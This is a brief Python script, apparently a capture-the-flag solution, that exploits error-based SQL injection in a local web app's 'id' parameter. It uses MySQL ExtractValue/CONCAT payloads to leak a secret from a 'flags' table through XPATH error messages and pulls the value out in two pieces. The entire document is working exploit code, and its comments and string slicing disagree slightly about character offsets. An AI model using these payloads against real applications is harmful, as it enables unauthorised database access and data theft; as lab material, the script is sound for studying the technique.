#!/usr/bin/env python3
import requests
import re

BASE_URL = "http://localhost:5011/article"

def extract_part(payload):
    """Extract data from error message"""
    r = requests.get(BASE_URL, params={"id": payload})
    match = re.search(r"XPATH syntax error: '~([^']*)'", r.text)
    return match.group(1) if match else ""

# Payload 1: Get first 31 characters
payload1 = "1 AND ExtractValue(1,CONCAT(0x7e,(SELECT value FROM flags LIMIT 0,1)))-- -"
part1 = extract_part(payload1)
print(f"[+] Part 1: {part1}")

# Payload 2: Get remaining characters from position 30
payload2 = "1 AND ExtractValue(1,CONCAT(0x7e,SUBSTRING((SELECT value FROM flags LIMIT 0,1),30)))-- -"
part2 = extract_part(payload2)
print(f"[+] Part 2: {part2}")

# Combine parts (part2 starts at position 30, so we take part1[0:29] + part2)
flag = part1[:29] + part2
print(f"\n[+] Full Flag: {flag}")

